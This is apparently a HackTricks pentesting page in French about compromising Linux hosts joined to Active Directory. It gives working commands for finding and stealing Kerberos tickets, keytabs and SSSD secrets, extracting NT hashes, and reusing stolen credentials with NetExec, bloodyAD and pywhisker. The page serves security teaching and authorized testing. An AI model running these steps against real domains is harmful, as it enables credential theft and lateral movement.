# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Une machine Linux peut aussi être présente dans un environnement Active Directory.

Une machine Linux dans un AD peut **stocker localement du matériel Kerberos** : les ccaches utilisateur, les keytabs machine/service, et les secrets gérés par SSSD. Ces artefacts peuvent généralement être réutilisés comme n’importe quel autre identifiant Kerberos. Pour en lire la plupart, vous devrez être l’utilisateur propriétaire du ticket ou **root** sur la machine.

## Enumeration

### AD enumeration from linux

Si vous avez un accès à un AD sous Linux (ou bash sous Windows), vous pouvez essayer [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) pour énumérer l’AD.

Vous pouvez aussi consulter la page suivante pour apprendre **d’autres façons d’énumérer AD depuis linux** :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA est une **alternative** open-source à Microsoft Windows **Active Directory**, principalement pour les environnements **Unix**. Il combine un **LDAP directory** complet avec un **Kerberos** Key Distribution Center MIT pour une gestion similaire à Active Directory. En utilisant le Dogtag **Certificate System** pour la gestion des certificats CA & RA, il prend en charge l’authentification **multi-factor**, y compris les smartcards. SSSD est intégré pour les processus d’authentification Unix. En savoir plus à ce sujet dans :

{{#ref}}
../freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

Avant de toucher aux tickets, identifiez **comment l’hôte a été joint à AD** et **où le matériel Kerberos est réellement stocké**. Sur les hôtes Linux modernes, cela est généralement géré par `realmd` + `adcli` + `sssd`, et pas seulement par des fichiers plats dans `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Cela vous indique rapidement si l’hôte fait confiance à AD, si SSSD met en cache les identités ou les tickets, et si des **machine/service keytabs** ou des **KCM secrets** sont disponibles à exploiter.

## Playing with tickets

### Pass The Ticket

Sur cette page, vous allez trouver différents endroits où vous pourriez **trouver des kerberos tickets à l’intérieur d’un hôte linux**. Dans la page suivante, vous pouvez apprendre comment transformer ces formats de tickets CCache en Kirbi (le format que vous devez utiliser dans Windows) et aussi comment effectuer une attaque PTT :


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Si vous voulez les workflows de récupération de tickets spécifiques à **Linux** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, etc.), consultez la page dédiée :

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Réutilisation des tickets CCACHE depuis /tmp

Les fichiers CCACHE sont des formats binaires pour **stocker des identifiants Kerberos**. `FILE:/tmp/krb5cc_%{uid}` est encore courant, mais les déploiements Linux modernes utilisent aussi `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, ou `KCM:%{uid}`. Vérifiez la variable d’environnement **`KRB5CCNAME`** et le paramètre `default_ccache_name` avant de supposer que les tickets se trouvent dans `/tmp`.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Réutilisation de ticket CCACHE depuis le keyring

**Les tickets Kerberos stockés dans la mémoire d’un processus peuvent être extraits**, en particulier lorsque la protection ptrace de la machine est désactivée (`/proc/sys/kernel/yama/ptrace_scope`). Un outil utile à cet effet se trouve à [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), qui facilite l’extraction en s’injectant dans les sessions et en vidant les tickets dans `/tmp`.

Pour configurer et utiliser cet outil, les étapes ci-dessous sont suivies :
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Cette procédure tentera d’injecter dans diverses sessions, en indiquant le succès en stockant les tickets extraits dans `/tmp` avec une convention de nommage `__krb_UID.ccache`.

### Réutilisation de ticket CCACHE depuis SSSD KCM

SSSD conserve une copie de la base de données au chemin `/var/lib/sss/secrets/secrets.ldb`. La clé correspondante est stockée sous forme de fichier caché au chemin `/var/lib/sss/secrets/.secrets.mkey`. Par défaut, la clé n’est lisible que si vous avez des permissions **root**.

L’appel de **`SSSDKCMExtractor`** avec les paramètres --database et --key analysera la base de données et **décryptera les secrets**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Le **blob Kerberos du cache d’identifiants** peut être converti en un fichier **Kerberos CCache** utilisable, qui peut ensuite être transmis à Mimikatz/Rubeus.

### Triage rapide du keytab
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Extraire des comptes depuis /etc/krb5.keytab

Les clés de service, essentielles pour les services s’exécutant avec des privilèges root, sont stockées de manière sécurisée dans des fichiers **`/etc/krb5.keytab`**. Ces clés, comparables à des mots de passe pour les services, exigent une stricte confidentialité.

Pour inspecter le contenu du fichier keytab, **`klist`** peut être utilisé. Sur Linux, `klist -k -K -e` affiche les principals, les numéros de version de clé, les types de chiffrement et le matériau brut de la clé. Si le type de clé est **23 / RC4-HMAC**, la valeur de la clé est également le **NT hash** de ce principal.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Pour les utilisateurs Linux, **`KeyTabExtract`** offre la fonctionnalité d'extraire le hash RC4 HMAC, qui peut être utilisé pour la réutilisation du hash NTLM. Notez que cela n’aide que lorsque le keytab contient encore du matériel **etype 23 / RC4-HMAC**. Dans les environnements **AES-only**, vous n’obtiendrez peut-être pas un NT hash réutilisable, mais vous pouvez quand même vous authentifier directement avec le keytab via Kerberos.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Sur macOS, **`bifrost`** sert d’outil pour l’analyse des fichiers keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
En utilisant les informations de compte et de hash extraites, des connexions aux serveurs peuvent être établies à l'aide d'outils comme **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Réutiliser le compte machine depuis `/etc/krb5.keytab`

Sur les systèmes joints via `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` contient généralement le **computer account** et un ou plusieurs **host/service principals**. Si vous avez **root**, ne vous contentez pas de le dumper : utilisez l’un des principals listés par `klist -k` pour demander un TGT et opérer en tant que l’hôte Linux lui-même.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Ceci est particulièrement utile lorsque l’**computer object** lui-même possède des droits délégués dans AD ou lorsque l’hôte est autorisé à récupérer d’autres secrets tels qu’un **gMSA**.

### Réutiliser le matériel Kerberos volé avec des outils AD Linux-first

Une fois que vous avez un `ccache` valide ou un keytab utilisable, vous pouvez agir sur AD **directement depuis Linux** sans tout convertir d’abord en formats Windows. Beaucoup d’outils modernes acceptent `KRB5CCNAME` / l’auth Kerberos nativement :
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
C'est un bon pont entre **Linux post-exploitation** et **AD object abuse**. Pour les chemins d'abuse au niveau des objets eux-mêmes, consultez :

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Artefacts Linux gMSA / Managed Service Account

Les déploiements Linux récents peuvent consommer directement des **Managed Service Accounts** depuis AD. En pratique, cela signifie qu'après avoir compromis un serveur Linux, vous pouvez trouver non seulement le keytab de l'hôte, mais aussi des **service-specific keytabs** générés à partir d'un gMSA. Les emplacements courants à inspecter sont `/etc/gmsad.conf`, les fichiers de configuration spécifiques au déploiement, et d'autres fichiers `*.keytab` sous `/etc`.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Cela vous donne une identité Kerberos réutilisable pour les SPNs liés à ce gMSA **sans toucher à aucun endpoint Windows**. Pour l’abus de gMSA/dMSA côté **domain-side** après des privilèges plus élevés dans AD, consultez :

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
